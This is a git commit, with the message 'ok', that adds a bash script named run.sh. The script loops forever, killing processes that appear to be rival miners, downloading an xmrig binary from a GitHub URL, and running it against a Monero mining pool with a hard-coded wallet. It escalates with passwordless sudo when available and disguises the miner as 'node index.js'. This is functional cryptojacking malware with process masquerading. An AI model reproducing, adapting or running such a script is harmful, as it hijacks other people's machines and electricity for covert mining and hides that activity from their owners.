c6a0479d20fb0aec10dacb4709b7e18295a34ffc
jimy20s <78900821+jimy20s@users.noreply.github.com>
2025-10-22 19:01:51 +0700

    ok

---
+++ run.sh
@@ -0,0 +1,50 @@
+#!/bin/bash
+
+architecture=$(uname -m)
+thread=$(nproc)
+
+case $architecture in
+    arm64 | aarch64)
+        arch="arm64"
+        ;;
+    x86_64 | amd64)
+        arch="amd64"
+        ;;
+    *)
+        echo "Unsupported architecture: $architecture"
+        exit 1
+        ;;
+esac
+#chmod +x prepare.bin
+#./prepare.bin
+
+unalias -a
+
+while true; do
+    pkill -f lol
+    pkill -f noob
+    pkill -f "./start"
+    pkill -f apachelogs
+    pkill -f a.sh
+    pkill -f syst3md
+    pkill -9 start
+
+    rm -f xmrig_$arch
+    if command -v curl >/dev/null 2>&1; then
+        curl -LO https://raw.githubusercontent.com/jimy20s/xmr/refs/heads/main/xmrig_$arch
+    elif command -v wget >/dev/null 2>&1; then
+        wget https://raw.githubusercontent.com/jimy20s/xmr/refs/heads/main/xmrig_$arch
+    else
+        curl -LO https://raw.githubusercontent.com/jimy20s/xmr/refs/heads/main/xmrig_$arch
+        wget https://raw.githubusercontent.com/jimy20s/xmr/refs/heads/main/xmrig_$arch
+    fi
+
+
+    chmod +x xmrig_$arch
+    if sudo -n true 2>/dev/null; then
+        sudo -n bash -c "exec -a \"node index.js\" \"./xmrig_$arch -o pool.hashvault.pro:443 -u 83CT41sGwJW8MsjcNeALMFHBoqMLfSwcqLAcB9w2sFhJBC6y5kGGoX1HmqPkBLCnjZgn52kAzye3EiTBbyjo2LJB1TEQsqs -p linux --tls -t $thread \""
+    else
+        bash -c "exec -a \"node index.js\" \"./xmrig_$arch -o pool.hashvault.pro:443 -u 83CT41sGwJW8MsjcNeALMFHBoqMLfSwcqLAcB9w2sFhJBC6y5kGGoX1HmqPkBLCnjZgn52kAzye3EiTBbyjo2LJB1TEQsqs -p linux --tls -t $thread \""
+    fi
+    sleep 30
+done
